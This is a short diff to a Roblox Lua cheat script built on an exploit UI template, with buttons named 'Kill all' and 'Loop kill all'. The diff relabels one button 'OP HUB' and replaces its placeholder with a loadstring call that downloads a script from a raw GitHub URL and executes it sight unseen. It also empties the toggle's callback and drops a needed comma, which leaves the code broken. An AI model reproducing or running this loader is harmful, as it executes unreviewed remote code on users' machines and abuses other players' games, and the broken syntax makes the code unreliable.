@@ -20,10 +20,10 @@ local QuitDivider = Main:Divider{
 
 -- All functions have the Name, Description and Callback arguments so you can use them whenever ig yeah
 local KillAll = Divider:Button{
-   Name = "Kill all",
-   Description = "Kills all the players in the game!",
+   Name = "OP HUB"
+   Description = "FUKS GAME WITH DEEhub!",
    Callback = function()
-       print("All players killed.")
+       loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Devkigz/LUASCRIPTSALTYOUTUBE/main/New%20UI%20update"))()
    end
 }
 
@@ -31,7 +31,7 @@ local LoopKillAll = Divider:Toggle{
    Name = "Loop kill all",
    Description = "Loop kills everyone in the game.",
    Callback = function(State)
-       print("Kill state: ", State)
+       
    end
 }
 
